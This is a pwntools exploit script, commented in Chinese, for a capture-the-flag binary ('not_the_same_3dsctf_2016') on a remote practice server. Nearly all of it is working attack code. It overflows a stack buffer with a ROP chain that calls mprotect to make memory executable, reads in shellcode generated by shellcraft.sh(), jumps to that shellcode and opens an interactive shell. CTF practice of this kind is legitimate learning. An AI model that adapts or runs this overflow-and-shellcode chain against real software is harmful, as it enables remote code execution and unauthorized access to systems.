from pwn import *

elf = ELF('./not_the_same_3dsctf_2016')
p = remote('node4.buuoj.cn', 26172)
#p = process('./not_the_same_3dsctf_2016')

#1.获取 mprotect() 函数相关信息
#int mprotect(void *addr, size_t len, int prot);
#addr 内存启始地址; len  修改内存的长度 ; prot 内存的权限;
pop3_ret = 0x0804f420 #取三个寄存器 0x0804f420 : pop ebx ; pop esi ; pop ebp ; ret
#压入三个参数
mem_addr = 0x080EB000
mem_len = 0x1000
mem_prot = 0x7

mprotect_addr = elf.symbols['mprotect']
read_addr = elf.symbols['read']

payload = b'a' * 45
payload += p32(mprotect_addr)
payload += p32(pop3_ret) 


payload += p32(mem_addr) 
payload += p32(mem_len)  
payload += p32(mem_prot)   

#2.返回地址填上read函数，我们接下来要将shellcode读入程序段
payload += p32(read_addr)
#ssize_t read(int fd, void *buf, size_t count);
#fd 设为0时就可以从输入端读取内容    设为0
#buf 设为我们想要执行的内存地址      设为我们已找到的内存地址0x80EB000
#size 适当大小就可以               只要够读入shellcode就可以，设置大点无所谓
payload += p32(pop3_ret)
#read()的三个参数 
payload += p32(0)     
payload += p32(mem_addr)   
payload += p32(0x100)

payload += p32(mem_addr)   

p.sendline(payload)
#已完成了修改内存为可读可写可执行，将程序重定向到了修改好后的内存地址，传入shellcode
payload = asm(shellcraft.sh()) 
p.sendline(payload)

p.interactive()